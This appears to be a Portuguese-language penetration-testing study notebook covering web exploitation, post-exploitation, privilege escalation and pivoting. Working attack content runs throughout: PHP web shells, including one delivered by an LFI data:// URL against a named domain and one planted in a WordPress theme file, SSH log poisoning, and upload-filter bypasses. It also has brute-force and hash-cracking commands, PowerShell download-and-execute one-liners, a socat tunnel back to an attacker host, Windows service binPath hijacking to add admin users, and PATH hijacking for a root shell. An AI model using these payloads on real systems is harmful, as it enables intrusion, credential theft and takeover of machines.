view-source:http://rh.businesscorp.com.br/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImhhY2siXSk7Pz4=&hack=id

```

**bypass de file upload (permitido: .pdf, upado: .php)**
em alguns casos, basta trocar o Content-type para dar bypass na extensão permitida:
no exemplo abaixo o site permitia apenas arquivos .pdf
```
# antes
Content-Type: application/x-php
# depois
Content-Type: application/pdf
```
## joomla
```
joomscan -u URL
```
## .htaccess
indica para interpretar arquivos `.sec` como `.php`
```
AddType application/x-httpd-php .sec
```


## wordpress
versão do wordpress
```
URL/readme.html
```
username in .json file
```
URL/wp-json/wp/v2/users/
```
 - https://wpscan.com/wordpresses/
 
 wordpress
```
wpscan --url URL --enumerate ap,at,dbe,cb,u --detection-mode aggressive
```
Command Breakdown:
- ap = All Plugins
- at = All Themes
- dbe = Database Exports
- cb = Config Backups
- u = Enumerate Users
- Detection-Mode = Since we’re not worried about being detected we can use aggressive mode which occasionally delivers more results at the cost of generating more noise.

bruteforce de senhas com `XML-RPC` 
```
wpscan --url URL --usernames kwheel,bjoel --passwords ~/wordlist/rockyou.txt
```
http://blog.thm/xmlrpc.php
	XML-RPC server accepts POST requests only.


arquivo de configuração `wp-config.php`
```
/wp-config.php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');


/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'LittleYellowLamp90!@');

```

path dos plugins/temas
```
/wp-content
```

**estrutura do banco de dados:**
- https://wp-staging.com/docs/the-wordpress-database-structure/
- 
tabelas do banco de dados wordpress
```
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |

```

tabela wp_users
```
describe wp_users;
+---------------------+-----------------+------+-----+---------------------+
| Field               | Type            | Null | Key | Default             |
+---------------------+-----------------+------+-----+---------------------+
| ID                  | bigint unsigned | NO   | PRI | NULL                |
| user_login          | varchar(60)     | NO   | MUL |                     |
| user_pass           | varchar(255)    | NO   |     |                     | 
| user_nicename       | varchar(50)     | NO   | MUL |                     | 
| user_url            | varchar(100)    | NO   |     |                     |
| user_registered     | datetime        | NO   |     | 0000-00-00 00:00:00 |
| user_activation_key | varchar(255)    | NO   |     |                     |
| user_status         | int             | NO   |     | 0                   |
| display_name        | varchar(250)    | NO   |     |                     | 
+---------------------+-----------------+------+-----+---------------------+

```


### wp_hash
cracking hash user_pass
```
john --format=phpass HASH.txt --wordlist=WORDLIST.TXT

hashcat -m 400 HASH.txt wordlist.txt
```

arquivo editavel `wordpress classic` `/themes -> 404.php`
```
<?php 
echo system($_REQUEST['desec']); 
?> 

<?php 
echo system($_GET['desec']); 
?>
```
path para themes, `wp-content/themes/classic/404.php`
```
http://37.59.174.231/blog/wp-content/themes/classic/404.php?desec=ls%20-la%20/
```
## log poisoning (ssh/apache/mail)
arquivos de log
```
# ssh
var/log/auth.log

# apache2
/var/log/apache2/error.log
/var/log/apache2/access.log
```

obs: no caso do ssh, ele não permite o envio de caracteres especiais, então então envie o payload via nc e isso vai gerar um log
```
nc -v 172.16.1.177 22                 
172.16.1.177 [172.16.1.177] 22 (ssh) open
SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze5
<?php system($_GET["hack"]);?>
Protocol mismatch.


GET /lfi.php?file=/var/log/auth.log&hack=ls+-la
```

https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/


## webmin
**Webmin** is a web-based server management control panel for Unix-like systems.
**Arquivos de Configuração do Webmin**:
```
/etc/webmin/miniserv.conf  # Contém configurações do servidor Webmin, como portas, SSL e permissões.  

/etc/webmin/miniserv.users # Contém usuários e senhas (em formato hash) do Webmin.
 
/etc/webmin/config # Contém configurações globais do Webmin.


/var/webmin/webmin.log 
/etc/webmin/webmin.groups
```
Na documentação diz que o path pode ser `/etc/usermin/miniserv.conf`, dando a entender que **dependendo do usuário pode mudar o path**
	No freebsd por exemplo o path é `/usr/local/etc/webmin`

**file disclosure:**
msfconsole module: admin/webmin/file_disclosure no path `/etc/webmin/miniserv.conf`
```
admin:$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1:0
```


### hash crack example
cracking with john
```
# example
admin:$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1:0 # hash.txt

john --format=md5crypt hash.txt # cracking
```

**cracking with hashcat:**
With hashcat, we need to remove `admin:` and the `:0` and left only the hash `$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1`
```
# hash.txt
$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1

# cracking
hashcat -m 500 hash.txt [path_to_wordlist]

hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt --show
$1$XXXXXXXX$WHEbJtn2Q0oxB3s4C6osu1:admin123456

```
notice, we remove the username `admin` from the hash.txt and the hashcat output only the password `admin123456`. For this reason we should make notes and save the username

- **`$1$`**: Indica que a hash é do tipo MD5-crypt.
- **`XXXXXXXX`**: Salt (valor aleatório usado para gerar a hash).
- **`WHEbJtn2Q0oxB3s4C6osu1`**: Hash MD5-crypt da senha.
- **`0`**: Indica que o usuário está ativo.
## OWASP
livro
- https://github.com/OWASP/wstg/releases
youtube
- https://www.youtube.com/@OWASPGLOBAL/videos
aplicação vulnerável
- https://owasp.org/www-project-juice-shop/
- https://hub.docker.com/r/bkimminich/juice-shop


# pós exploração

## transferência de arquivos
**windows**
```
certutil.exe -urlcache -f http://IP:PORT/file.txt output_filename.exe # alerta de trojan

powershell.exe wget URL -Outfile file.exe

powershell -c "wget http://IP:PORT/cred.txt -Outfile filename.txt"

powershell.exe (New-Object System.Net.WebClient).DownloadFtring('URL/file.txt','file.txt')

powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('URL/file.txt') # lê o arquivo .txt e executa as intruções que estiverem nele
```

**linux**
```
wget http://IP/file.exe -O /tmp/file.exe
curl http://IP/file.exe -o file.exe
```


### via ftp
o utilitário ftp do windows tem a flag `-s` que permite usarmos um arquivo .txt para especificar os comandos ftp que serão executados. Assim criamos o arquivo ftp.txt com as instruções que desejamos para baixar o arquivo do nosso servidor ftp

arquivo `ftp.txt`
```
open IP
USER anonymous
PASS anonymous
bin
GET file.exe
QUIT
```
no alvo windows:
```
ftp -v -n -s:ftp.txt
```

servidor ftp com python
- https://docs.python.org/3/library/ftplib.html


### exe2hex
programa transforma binário em hexadecimal

1. comprimir o arquivo a ser transferido
   ```
   upx -9 file.exe
   ```
2. exe2hex
   ```
   exe2hex -x file.exe -p file.txt
   ```
   para windows mais antigos, substituiriamos a flag `-p` (powershell) para `-b` batch (sistemas antigos)
    `-b` BAT      BAT output file (DEBUG.exe method - x86)
	`-p` POSH     PoSh output file (PowerShell method - x86/x64)

3. copia o conteudo do plink.txt
   ```
   cat file.txt | toclip
   ```
4. Reconstrói o arquivo na máquina alvo pelo terminal
   ```
   ctrl+v
   ```


### falsificação de assinatura
- Quando o servidor não possui utilitários para envio de arquivos, mas há possibilidade de fazermos upload de arquivos por uma aplicação web, podemos falsificar a assinatura do arquivo suportado, pdf por exemplo, e enviarmos o nosso payload.

https://sagarsajeev.medium.com/file-upload-bypass-to-rce-76991b47ad8f
- Renamed the payload from : ‘payload.php’ to ‘payload.php\x00.png’ Appending \x00.png to the end bypassed the restriction(Null Byte). 
	- I also found out that backend filters and removes certain keywords. For example, it removes the term ‘.php’. So we can rename a file as ‘payload.p.phphp’. So when the filter removes ‘.php’ , the file name would become ‘payload.php’. Since the firewall has been bypassed at this stage, script will be executed. One of [John Hammonds video](https://www.youtube.com/c/JohnHammond010) helped me with this.
- 
### tunneling (linux)
O tunelamento permite um atacante acessar serviços locais da máquina alvo

#### tunelamento via socat
atacante
```
socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
```
máquina alvo linux
```
socat TCP4:ATACCKER_IP:8443 TCP4:127.0.0.1:22
```

Agora podemos interagir com o serviço da máquina alvo que roda localmente, através da porta 2222, que está rodando na máquina do atacante.

**obs:** a porta 2222 só será aberta na máquina do atacante a partir do momento que executarmos o tunelamento na máquina alvo.

máquina atacante
```
ssh root@127.0.0.1 -p 2222
```
Assim estabelecemos conexão com o ssh do servidor alvo que está rodando localmente.


#### tunelamento via ssh
**criando o tunel na máquina atacante**
```
ssh -L 3306:localhost:3306 usuario@192.168.1.100
```

**na máquina atacante, conectando no túnel**
```
mysql -h 127.0.0.1 -P 3306 -u usuario_banco -p
```

```
ssh -L [porta_local]:[destino]:[porta_destino] [usuário]@[servidor_ssh]
```

### tunelamento (windows)
falta fazer, precisa do plink e ncat
subir ssh na maquina do pentester
```
service ssh start
```

executar plink na servidor alvo
```

```


## Privilege escalation
### windows  commands

ativa o usuário guest
```
# ativa o usuário
net user Guest /active:yes

# muda a senha do guest
net user Guest novaSenha
```

mostra o usuário logado
```
whoami
```
mostra os grupos do usuario
```
whoami /groups
net user [USER]
```

cria um usuário
```
net user <username> <password> /add
net user hacker Pass123 /add

# cria usuario sem senha
net user <nome_do_usuario> "" /add
net user hacker "" /add # cuidado que por motivos de segurança o RDP não permite login de usuários sem senha
```

adiciona usuario a um grupo
```
net localgroup <group_name> <user> /add
net localgroup administrators guest /add
net localgroup "Remote Desktop Users" guest /add
```

exibe lista de membros do grupo
```
net localgroup <group_name>
net localgroup administrators
```

ativa um usuário
```
net user <user> /active:yes
net user guest /active:yes
```

muda senha do usuário
```
net user <user> <senha>
net user guest <senha>
```


exibe todos os usuários
```
net user
```
informações do sistema (adaptador de rede, DHCP ativo/desativado, versão do sistema 32/64 bits)
```
systeminfo
```
exibe o hostname do sistema
```
hostname
```
exibe os processos em execução e o serviço associado ao processo
```
tasklist /SVC
```
lista os adaptadores de rede
```
ipconfig /all
```
no caso de estarmos em um AD, o servidor DNS primário provavelmente é servidor AD na saida do comando `ipconfig /all`

executa comando com privilegio de um usuário especifico
```
runas /user:[USERNAME] [COMMAND]
```
informações da rede
```
arp -a
route print
```
verifica serviços ativos 
```
sc query [windefend]
```
verifica se o firewall esta ativo
```
netsh advfirewall show currentprofile
```
busca recursiva por arquivo
```
where /R c:\ file.txt 
```
busca por string em arquivos .txt
```
findstr /s "pass=" *.txt
```
- o comando `findstr` é equivalente ao comando grep do linux

Scan automatizados
- **Winpeas** https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- **wesng** https://github.com/bitsadmin/wesng
	1. colocar a saida do systeminfo no mesmo diretório que o arquivo `wes.py`
	2. `python wes.py -e systeminfo.txt`
 

#### bypass UAC
SystemInternals https://learn.microsoft.com/en-us/sysinternals/downloads/

##### utilitários do SystemInternals
verifica o modo de execução do processo
```
sigcheck.exe -a -m C:\Windows\System32\notepad.exe
```
procmon para monitorar o processo alvo
```
procmon.exe
```

accesschk.exe exibe processos que tenhamos permissão de Read and Write
```
accesschk.exe -wvcu "Users" *
```
* `*`: busca em todos os serviços



cve2019-1388 (execução do internet explorar com permissão de administrador)
##### PrivEsc services
wmic
```
wmic service get Name,State,PathName

wmic service get Name,State,PathName | findstr "running"

wmic service get Name,State,PathName | findstr "running" | findstr "Program"
```
obs: uma dica é procurar por programas instalados pelo usuários, possivelmente teremos um serviço mal configurado


**bypass para o caso de podermos alterar o binpath**
exibe as permissões do usuário atual para um determinador serviço
```
icacls PATH_TO_.EXE

icacls C:\Windows\System32\cmd.exe

sc query [SERVICE_NAME]
sc qc [SERVICE_NAME]
```

alterando o pathbin para executar comando
```
sc config [SERVICE_NAME] binPath="net user hack Admin@123 /add"

sc stop [SERVICE_NAME]
sc start [SERVICE_NAME]
```


**bypass para o caso de conseguirmos substituir o serviço**
basta substituir o arquivo .exe por uma backdoor

se o serviço for auto-start precisaremos reiniciar a máquina para executarmos a nossa backdoor
```
shutdown /r /t 0
```



## linux
enumeração de usuários e serviços
```
cat /etc/passwd
```
exibe o nome da maquina
```
hostname
```
versão do kernel e do sistema operacional
```
uname -a
cat /etc/issue
cat /etc/*-release
```
exibe a versão de um serviço
```
dpkg -l | grep wget 
```
configuração de rede/portas
```
ifconfig -a
route

netstat -nlpt # portas TCP abertas
netstat -nlpu # portas UDP abertas
```
processos em execução
```
ps aux
```
agendamento de tarefas automatizadas no crontab
```
cat /etc/crontab
```
buscar por diretórios que tenho permissão de escrita
```
find / -writable -type d 2>/dev/null
find / -type d \( -perm -u=w -o -perm -g=w \) -user $(whoami) 2>/dev/null
```
procura por arquivos que possuem o bit SUID ativado
```
find / -perm -u=s -type f 2>/dev/null
```
pesquisa por arquivos em que todos os usuários tenham permissão RWE
```
find / -type f -perm 777 2>/dev/null
```
configuração do sudo
```
sudo -l
```
procura de arquivos, a partir da raiz `/`, com base no nome:
```
# qualquer arquivo que tenha a palavra key
find / -type f -name "*key*"     # ex: key, key.txt, key1, key2, mykey

# arquivos nomeados exatamento como key
find / -type f -name "key"
```

script para scan automatizado
- linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/tag/20250202-a3a1123d
- linuex exploit suggester https://github.com/The-Z-Labs/linux-exploit-suggester

---------------------
### Hijacking de PATH
Quando um **binário ou script** chama um comando (como `cat`, `ls`, etc.) **sem usar o caminho absoluto** (ex.: `/bin/cat`), ele depende da variável `PATH` do sistema para encontrar o executável.  
Se você **controlar o `PATH`**, pode fazer o sistema executar uma **versão maliciosa** do comando em vez da original.

#### Teoria/explicação

##### Funcionamento do `PATH`

O `PATH` é uma lista de diretórios onde o sistema busca comandos, **na ordem em que aparecem**:

```
echo $PATH
# Exemplo:
/home/kali/.local/bin:/usr/local/bin:/usr/bin:/bin:/tmp
```
- O sistema **sempre verifica da esquerda para a direita**.
- O **primeiro comando encontrado** é o que será executado.
---

**Como Realizar o Hijacking**

**Forma Correta** (Prioriza seu diretório malicioso)

```
export PATH=/tmp:$PATH
```
- **Por quê?**
    - Adiciona `/tmp` **no início** do `PATH`.
    - se houver um `cat` em `/tmp`, ele será executado **antes** do `/bin/cat`.

**Forma Errada** (Ignora seu diretório malicioso)
```
export PATH=$PATH:/tmp
```
- **Por quê?**
    - Adiciona `/tmp` **no final** do `PATH`.
    - O sistema **só usará seu `cat` malicioso se não encontrar o comando nos diretórios anteriores** (`/bin`, `/usr/bin`, etc.).
---

**Exemplo Prático**

Suponha que:

1. O binário vulnerável chama `system("cat /etc/passwd")` (sem `/bin/cat`).
    
2. Você cria um `cat` malicioso em `/tmp`:
```
echo -e '#!/bin/sh\n/bin/bash -p' > /tmp/cat && chmod +x /tmp/cat
```   
    
3. **Modifica o `PATH` corretamente**:

```
export PATH=/tmp:$PATH
```    

4. **Executa o binário vulnerável**:
```   
./binario_vulneravel  # Agora executa SEU /tmp/cat (shell root)!
```

---

##### **Observações Importantes**

1. **Não use `PATH=/tmp` sozinho**
    
    - Isso **remove todos os outros diretórios** do `PATH`, quebrando comandos básicos (`ls`, `echo`, etc.).
        
    - Seu script malicioso pode até **falhar** se depender de outros binários.
        
2. **Sempre verifique a ordem do `PATH`**
```
echo $PATH
```

 - Certifique-se de que seu diretório malicioso (**`/tmp`**) está **no início**.
  
        
3. **Use `env` para testes isolados**

    `env PATH=/tmp:$PATH ./binario_vulneravel`
    
    - Altera o `PATH` apenas para esse comando, sem afetar o terminal atual.
---

**Dica:** Sempre use `which comando` para ver **qual versão** está sendo chamada.  
Exemplo:
```
which cat  # Mostra se está pegando o /tmp/cat ou /bin/cat
```

#### Ataque

Com isso, basta colocarmos um binário malicioso dentro do diretório `/tmp`
```
export PATH=/tmp:$PATH
echo "/bin/bash -p" > cat && chmod 777 cat
./script_vulneravel # executar script (com SUID) vulneravel a PATH Hijacking
```

## serviços 
(`start x enable` e `stop x disable`)
```
# verifica status do serviço
sudo systemctl status vsftpd

# iniciar o serviço agora
sudo systemctl start vsftpd

# para a execução do serviço agora
sudo systemctl start vsftpd

# serviço inicia com o boot
sudo systemctl enable vsftpd

# serviço desabilitado com o boot
sudo systemctl disable vsftpd
```


## Pivoting
https://www.offsec.com/metasploit-unleashed/pivoting/
**pivoting via meterpreter**
```
route
run autoroute -s 10.10.20.0/24
```
tunelamento
```
portfwd add -l [LOCAL_PORT] -p [HOST_PORT] -r [HOST_REMOTO]

portfwd add -l 110 -p 110 -r 10.10.20.4

```

pivoting via proxychains
1. usar o módulo auxiliar `auxiliary/server/socks4a`
2. configurar a mesma porta do módulo auxiliar no proxychains `/etc/proxychains.conf` `socks4 127.0.0.1 [PORT]`

obs: a conexão via pivoting é mais lenta, evite scanners com muitas portas.

# CMS

## OTRS 
Links importantes
- https://github.com/OTRS/otrs.github.io
- https://academy.otrs.com/doc/

| Diretório/Arquivo | Função                                              |
| ----------------- | --------------------------------------------------- |
| `/index.pl`       | Arquivo principal que inicia a aplicação (backend). |
| `/customer.pl`    | Portal do cliente.                                  |
| `/js/`            | Arquivos JavaScript.                                |
| `/css/`           | Arquivos de estilos (CSS).                          |
| `/img/`           | Imagens usadas na interface.                        |

# framework
## ColdFusion
default paths

| Caminho                          | Descrição                                                                                                  |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `/CFIDE/`                        | **Diretório administrativo padrão.** Contém ferramentas administrativas, scripts, templates e utilitários. |
| `/CFIDE/administrator/`          | **Painel de administração do ColdFusion.** Acesso via web. Se estiver exposto, é crítico.                  |
| `/CFIDE/componentutils/`         | Ferramentas de depuração e verificação de componentes.                                                     |
| `/CFIDE/scripts/`                | Scripts auxiliares utilizados por aplicações ColdFusion.                                                   |
| `/CFIDE/administrator/enter.cfm` | Página de login do administrador ColdFusion.                                                               |
| `/cfdocs/` ou `/CFDOCS/`         | Documentação padrão do ColdFusion (se estiver instalada).                                                  |
| `/cfusion/`                      | Caminho comum na estrutura de arquivos do servidor (nível de sistema, não necessariamente via web).        |
O path `ColdFusion8\lib\password.properties` armazena a **hash `md5`** do admin
```
ColdFusion8\lib>type password.properties
#Thu Mar 05 17:40:39 PST 2020
rdspassword=
password=86C16A459ECF39FD76A8E750F9D5074C4722F22B
encrypted=true
```

## Tomcat
wordlist com usuário e senha
```
seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt

# conteudo
tomcat:advagrant
tomcat:changethis
tomcat:password
tomcat:password1
tomcat:s3cret
tomcat:tomcat
xampp:xampp
server_admin:owaspbwa
admin:owaspbwa
demo:demo

```

brutar login page do tomcat 
```
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://172.16.1.156:8080/manager/html

```
- `-C FILE` --> colon separated "login:pass" format, instead of -L/-P options

# relatório
salvar os comandos do terminal e suas respectivas saidas
```
script [FILE_NAME]
comando1
comando2

exit
```

# dever de casa
1. comprometer os hosts 

	172.30.0.15
	172.30.0.20
	172.30.0.30
	172.30.0.40
	172.30.0.200


2. testar pivoting no rh.business



# estudar
- container
- jwt